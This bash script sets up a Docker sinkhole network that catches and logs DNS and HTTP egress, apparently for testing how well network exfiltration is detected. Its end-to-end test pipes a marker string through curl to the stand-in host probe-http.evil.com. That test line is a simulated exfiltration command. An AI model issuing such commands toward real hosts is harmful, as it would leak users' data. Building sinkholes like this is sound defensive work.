#!/usr/bin/env bash
# Stand up the egress sinkhole used for honest network-exfil recall.
#   network: cadc_sink (internal, no real internet)   sink IP: 172.19.0.2 (hardcoded in runners)
#   container: cadc_sinkhole (wildcard DNS + TCP catch-all, logs net.log/dns.log)
# Idempotent: safe to re-run.
set -u
cd "$(dirname "$0")/../.." || exit 1

echo "== build sinkhole image =="
docker build -t cadc-sinkhole sandbox/sinkhole || exit 1

echo "== (re)create internal network cadc_sink =="
docker rm -f cadc_sinkhole >/dev/null 2>&1 || true
docker network rm cadc_sink >/dev/null 2>&1 || true
docker network create --internal --subnet 172.19.0.0/24 cadc_sink || exit 1

echo "== run sink container at 172.19.0.2 =="
docker run -d --name cadc_sinkhole --network cadc_sink --ip 172.19.0.2 \
    --cap-add NET_ADMIN cadc-sinkhole || exit 1

sleep 2
echo "== sink health =="
docker logs cadc_sinkhole 2>&1 | head -3
docker exec cadc_sinkhole sh -c 'pgrep dnsmasq >/dev/null && echo "dnsmasq: up"; pgrep socat >/dev/null && echo "socat: up"; ls /var/log/sink'

echo "== end-to-end egress test (sandbox -> sink) =="
docker run --rm -i --network cadc_sink --dns 172.19.0.2 --cap-drop ALL --cap-add SYS_PTRACE \
    cada-sandbox bash -c 'getent hosts probe-dns.evil.com >/dev/null 2>&1; echo MARK_HTTP_PROBE | curl -s -m3 http://probe-http.evil.com/ --data-binary @- >/dev/null 2>&1; echo sandbox-done' 2>&1 | tail -2
sleep 1
echo "-- sink DNS log (expect probe-dns) --"
docker exec cadc_sinkhole sh -c 'grep -i probe-dns /var/log/sink/dns.log | head -2'
echo "-- sink NET log (expect MARK_HTTP_PROBE) --"
docker exec cadc_sinkhole sh -c 'grep -i MARK_HTTP_PROBE /var/log/sink/net.log | head -2'
echo "== done =="
